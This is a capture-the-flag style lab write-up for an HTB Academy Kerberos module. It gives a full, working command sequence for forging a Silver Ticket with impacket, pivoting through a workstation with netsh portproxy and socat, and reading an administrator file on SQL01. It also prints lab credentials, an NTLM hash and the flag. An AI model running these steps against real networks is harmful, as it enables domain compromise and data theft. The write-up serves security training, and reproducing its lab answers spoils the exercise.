# Silver Ticket

**Module:** HTB Academy — Kerberos Attacks
**Entry point:** `ACADEMY-KERBATTCK-WS01` (RDP given, but solved entirely from the attack box via `wmiexec.py` — no GUI session actually opened), domain `INLANEFREIGHT.LOCAL`
**Given access:** `htb-student` / `HTB_@cademy_stdnt!`
**Given:** `SQL01$`'s NTLM hash `027c6604526b7b16a22e320b76e54a5b`
**Goal:** read `C:\Users\Administrator\Documents\silverflag.txt` on `SQL01`

**Result:** `S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent` — Administrator-equivalent SMB access on SQL01 via a forged Silver Ticket, entirely from Linux with impacket, through a network pivot off WS01 (no RDP/GUI needed).

---

## 1. Attack chain (summary)

1. Confirm creds against WS01: `nxc smb <WS01 IP> -u htb-student -p 'HTB_@cademy_stdnt!'`.
2. WS01's AD domain (`INLANEFREIGHT.LOCAL`) and its DC (`172.16.99.3`) live on a second, internal-only NIC (`172.16.99.0/24`) not directly routable from the attack box — same topology as the earlier `Golden Ticket.md` task. Pivot through WS01 (`wmiexec.py` + `netsh interface portproxy`) to reach LDAP on the DC and resolve the real domain SID and SQL01's hostname/IP.
3. Forge the Silver Ticket with `ticketer.py`, using `SQL01$`'s NTLM hash, the real domain SID, and SPN `cifs/SQL01.INLANEFREIGHT.LOCAL`, impersonating `Administrator`. A Silver Ticket is a self-contained, offline-forged *service ticket* — unlike a Golden Ticket, it never needs to contact the KDC at all; only the target service's own hash and the domain SID are required.
4. Pivot a second time (new portproxy mapping) to reach SQL01's SMB port (445), since SQL01 is also on the internal-only subnet.
5. Read the flag with a raw `impacket.smbconnection.SMBConnection` Kerberos login using the forged ticket, `getFile` on `C$`.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 `STATUS_NO_LOGON_SERVERS` on the first assigned target — this time a real outage, not just "DC still booting"

First spawn (`10.129.205.26`): `nxc smb ... --local-auth` with a bogus user/pass gave the expected `STATUS_LOGON_FAILURE` (proving WS01/SMB itself was fine), while the real domain creds kept returning `STATUS_NO_LOGON_SERVERS` continuously for well over 10 minutes, with port 88 and 389 both closed on WS01's public IP throughout. This went well past the "DC still booting, retry after ~20s" pattern seen in the earlier `RBCD Overview & Attacking from Windows.md` task, so per standing guidance (debug the environment, don't doubt the question) the target was reset from the HTB Academy UI rather than waiting indefinitely. After reset (`10.129.70.137`), `nxc smb` authenticated immediately with `(Pwn3d!)` — confirms the issue was a genuinely broken/stuck lab instance, not a credentials or tooling problem.

### 2.2 Finding the internal DC and SQL01 — WS01 isn't itself a DNS server

`dig @<WS01 IP> ...` timed out — WS01 is a domain-joined workstation, not a DNS server, so it can't be queried directly over its public IP for DNS. Ran `wmiexec.py ... "ipconfig /all"` against WS01 instead, which showed a second NIC: `172.16.99.50/24`, gateway `172.16.99.1`, **DNS server `172.16.99.3`** (the real DC) — a network the attack box can't route to directly.

### 2.3 LDAP pivot to get the real domain SID and SQL01's hostname

Same dual-hop technique as the Golden Ticket task:
```bash
wmiexec.py '...@WS01_IP' "netsh interface portproxy add v4tov4 listenport=3890 listenaddress=0.0.0.0 connectport=389 connectaddress=172.16.99.3"
wmiexec.py '...@WS01_IP' "netsh advfirewall firewall add rule name=proxyldap dir=in action=allow protocol=TCP localport=3890"
socat TCP-LISTEN:389,fork,reuseaddr TCP:<WS01_IP>:3890 &
```
Then a plain `ldap3` NTLM bind to `127.0.0.1:389` as `htb-student` pulled `Administrator`'s `objectSid` (domain SID: `S-1-5-21-1870146311-1183348186-593267556` — same domain template as the Golden Ticket task) and `SQL01$`'s `dNSHostName` (`SQL01.INLANEFREIGHT.LOCAL`).

### 2.4 Resolving SQL01's actual IP — DNS over the same style of TCP pivot

LDAP doesn't store IP addresses on computer objects, so a second portproxy (`listenport=5353 connectport=53 connectaddress=172.16.99.3 protocol=tcp`) plus a local `socat` hop onto port 53, queried with `dig @127.0.0.1 +tcp SQL01.INLANEFREIGHT.LOCAL A +short`, resolved it to `172.16.99.45`.

### 2.5 `wmiexec.py` against the forged ticket: `Connection refused` — wrong assumption about which port mattered

First attempt pivoted only SMB (445) to SQL01 and tried `wmiexec.py -k -no-pass -target-ip 127.0.0.1`. Confirmed with a raw `/dev/tcp` connect test that local port 445 itself was open and reachable — so the refusal wasn't the SMB pivot. The actual cause: `wmiexec.py` uses DCOM/WMI, which needs the RPC endpoint mapper on port 135 (plus a dynamic high port) *in addition to* SMB — neither of which were proxied, and proxying dynamic RPC ports through two chained manual pivots isn't practical. Fixed by abandoning `wmiexec.py` entirely for this step and reading the flag directly over SMB instead (exactly the method used at the end of the Golden Ticket task): `impacket.smbconnection.SMBConnection` + Kerberos login + `getFile`, which only ever needs port 445.

### 2.6 Kerberos login with the Silver Ticket ccache still tried to fetch a fresh TGT — SPN name mismatch

```
OSError: [Errno Connection error (127.0.0.1:88)] [Errno 111] Connection refused
```
The ccache (inspected with `klist`) held exactly one entry: `cifs/SQL01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL` — a full FQDN service principal, as built by `ticketer.py -spn cifs/SQL01.INLANEFREIGHT.LOCAL`. The first `SMBConnection(remoteName='SQL01', ...)` call made impacket build the lookup SPN as `cifs/SQL01` (short name) internally, missed the cache, and silently fell back to requesting a brand-new TGT from a live KDC on port 88 — which doesn't exist for a Silver Ticket (no krbtgt key was ever used to forge this ticket, and there's no live KDC reachable at `127.0.0.1` anyway). Fixed by passing `remoteName='SQL01.INLANEFREIGHT.LOCAL'` (matching the ccache's SPN exactly) — the cached TGS was then found and used directly, with no KDC contact at all. This matches the point in §1.3: a Silver Ticket is entirely offline once forged; any code path that tries to touch port 88 for it is a cache-lookup bug, not a legitimate requirement.

---

## 3. Full command sequence (as actually run)

```bash
# 1. Confirm creds
nxc smb 10.129.70.137 -u htb-student -p 'HTB_@cademy_stdnt!'

# 2. Find the internal DC
wmiexec.py 'INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt!@10.129.70.137' "ipconfig /all"
# -> 172.16.99.50/24, DNS Servers: 172.16.99.3

# 3. Pivot LDAP to the DC
wmiexec.py '...@10.129.70.137' "netsh interface portproxy add v4tov4 listenport=3890 listenaddress=0.0.0.0 connectport=389 connectaddress=172.16.99.3"
wmiexec.py '...@10.129.70.137' "netsh advfirewall firewall add rule name=proxyldap dir=in action=allow protocol=TCP localport=3890"
socat TCP-LISTEN:389,fork,reuseaddr TCP:10.129.70.137:3890 &

python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
s = Server('127.0.0.1', port=389, get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\htb-student', password='HTB_@cademy_stdnt!', authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=Administrator)', attributes=['objectSid'])
print(c.entries[0].objectSid)                      # S-1-5-21-1870146311-1183348186-593267556-500
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=SQL01\$)', attributes=['dNSHostName'])
print(c.entries[0].dNSHostName)                    # SQL01.INLANEFREIGHT.LOCAL
"

# 4. Pivot DNS to resolve SQL01's IP
wmiexec.py '...@10.129.70.137' "netsh interface portproxy add v4tov4 listenport=5353 listenaddress=0.0.0.0 connectport=53 connectaddress=172.16.99.3 protocol=tcp"
wmiexec.py '...@10.129.70.137' "netsh advfirewall firewall add rule name=proxydns dir=in action=allow protocol=TCP localport=5353"
socat TCP-LISTEN:53,fork,reuseaddr TCP:10.129.70.137:5353 &
dig @127.0.0.1 +tcp SQL01.INLANEFREIGHT.LOCAL A +short   # 172.16.99.45

# 5. Forge the Silver Ticket (fully offline — no KDC contact)
ticketer.py -nthash 027c6604526b7b16a22e320b76e54a5b \
    -domain-sid S-1-5-21-1870146311-1183348186-593267556 \
    -domain INLANEFREIGHT.LOCAL -spn cifs/SQL01.INLANEFREIGHT.LOCAL Administrator
# -> Administrator.ccache

# 6. Pivot SMB to SQL01
wmiexec.py '...@10.129.70.137' "netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.99.45"
wmiexec.py '...@10.129.70.137' "netsh advfirewall firewall add rule name=proxysmbsql dir=in action=allow protocol=TCP localport=4455"
socat TCP-LISTEN:445,fork,reuseaddr TCP:10.129.70.137:4455 &

# 7. Use the ticket, read the flag (remoteName must exactly match the ccache's SPN)
export KRB5CCNAME="$(pwd)/Administrator.ccache"
python3 - <<'EOF'
from impacket.smbconnection import SMBConnection
import io
conn = SMBConnection(remoteName='SQL01.INLANEFREIGHT.LOCAL', remoteHost='127.0.0.1', sess_port=445)
conn.kerberosLogin(user='Administrator', password='', domain='INLANEFREIGHT.LOCAL',
                    useCache=True, kdcHost='127.0.0.1')
buf = io.BytesIO()
conn.getFile('C$', 'Users\\Administrator\\Documents\\silverflag.txt', buf.write)
print(buf.getvalue().decode())
EOF
# S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent
```

---

## 4. Flag

**`S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent`**

---

## 5. Key takeaways

- A Silver Ticket only needs the target **service account's** own hash (here `SQL01$`'s machine account NTLM hash) plus the domain SID — it never touches the krbtgt key or contacts a live KDC, unlike a Golden Ticket. Any error that implies a KDC connection attempt while using a Silver Ticket is a client-side cache/SPN bug, not a missing requirement.
- When using a forged ccache with impacket's `SMBConnection.kerberosLogin`, `remoteName` must produce the *exact* SPN string stored in the ccache (check with `klist`) — a short hostname vs. FQDN mismatch causes a silent fallback to requesting a brand-new TGT, which then fails if no real KDC is reachable.
- `wmiexec.py`/DCOM needs RPC endpoint-mapper (135) plus dynamic high ports in addition to SMB (445) — not practical to pivot through simple `netsh portproxy`/`socat` chains. When the goal is just reading a file, a raw `SMBConnection.getFile()` call only needs port 445 and avoids the RPC dependency entirely.
- `STATUS_NO_LOGON_SERVERS` persisting for 10+ minutes with Kerberos/LDAP ports fully closed is a stronger signal than the brief "DC still booting" blip seen in earlier tasks — worth resetting the target from the HTB UI rather than continuing to retry indefinitely.
- Once the DC is reachable only from an internal-only NIC on a pivot host, the same recipe (LDAP for AD data, DNS for name resolution, SMB for file access — each via its own `netsh portproxy` + `socat` hop) generalizes to reach any additional internal host (like `SQL01` here), not just the DC itself.
